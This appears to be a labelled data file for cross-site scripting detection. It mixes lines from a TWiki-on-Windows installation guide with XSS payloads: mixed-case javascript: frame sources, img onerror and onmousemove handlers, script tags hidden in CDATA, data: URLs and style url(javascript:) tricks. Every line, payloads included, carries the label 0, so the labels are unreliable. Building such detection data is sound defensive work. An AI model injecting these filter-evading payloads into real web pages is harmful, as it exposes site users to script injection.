'><frame src='JaVaScRiPt:alert(1)'><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
Specify <code><b>c:\</b></code> as the installation directory - this actually installs Apache into <code><b>c:\apache</b></code> (if you specify <code>c:\apache</code>	0
; alert(); /* <h1><a name="TWiki_Installation_Guide"> TWiki Installation Guide </a></h1><tr><td>minutes</td></tr> */	0
<img src=x onErRor=alert`1`;><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
' /><frame src='javascript:alert`1`;'><!-- <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> -->	0
Another useful command is <code>apache -k stop</code>.	0
<![CDATA['><script>alert`1`</script><!--]]><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
Type <code>perl -v</code> - you should see cygwin mentioned in the first line, and the Perl version, 5.6.1	0
<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/new.gif" border="0" alt="NEW" width="28" height="8" />	0
 onmouSemoVe=alert(1); /* <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> */	0
<a href="http://twiki.org/cgi-bin/view/Support.TwikiOnWindowsBinaryAttachments" title="'Support.TwikiOnWindowsBinaryAttachments' on TWiki site, we know it!">TWiki:Support</a>.	0
<strong><em>NOTE</em></strong>: The Apache package itself requires a download of around 2 MB, and up to 10 MB of free disk space once installed.	0
<s><script>alert`1`</script> <!-- <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> -->	0
; alert``; /* <h1><a name="TWiki_Installation_Guide"> TWiki Installation Guide </a></h1><tr><td>minutes</td></tr> */	0
<strong>4. Install Cygwin</strong>	0
<table border="1" cellspacing="0" cellpadding="1"> <tr><th bgcolor="#99CCCC"> <strong>Component</strong> </th><th bgcolor="#99CCCC">	0
data:text/html,<script>alert(1)</script>Web index, ex: list of all webs. Hidden webs are excluded, e.g. <br /> <code>%TOPICLIST{" &nbsp; * web.name"}%</code> creates a bullet list of all topics.	0
<tr><td> Unix tools </td><td> Cygwin 1.3.9 </td><td> Simplest way to get a whole set of required tools </td></tr>	0
<h2><a name="Installing_Components"> Installing Components </a></h2>	0
<iframe src=# onmouseover='alert`1`'></iframe><tr><td> minutes </td><td> minutes </td><td> 59 </td></tr>	0
<tr><td> Operating System </td><td> Windows 2000 </td><td> Should also work for Windows NT </td></tr>	0
'onMouseMove='alert`1`;' 'onFocusOut='alert`1` /* <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> */'	0
If you have an older version of any component, do yourself a favour and <strong>upgrade it</strong> as part of the install process.	0
 onErRor=alert(1); /* <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> */	0
Leave the radio button on <strong>Curr</strong> (Current)	0
If you already have some of these add-ons installed, here's how to check the versions - this assumes you have	0
Type <code><b>cat -v t</b></code> - you should see <code><b>hi</b></code> as the output	0
a style=background:url(jaVaScRiPt:alert(1))  <!-- <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> -->	0
 onmousemove=alert`1`; /* <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> */	0
<strong>3. Test Apache</strong>	0
 onErRor=alert`1`; /* <tr><td> minutes </td><td> minutes </td><td> 59 </td></tr> */	0
<a href="http://www.apache.org/dist/httpd/Announcement.html" target="_top">this page</a>	0
If you see filename errors, your <strong>mounts did not work</strong> for some reason - check your typing	0
<code>nano</code>, a non-GUI editor, but if you prefer to use a GUI editor, you should first install PFE, a freeware editor that supports Unix format files. PFE is available	0
<code>%STARTINCLUDE%</code>TWiki<style=background:url(javascript(1))	0
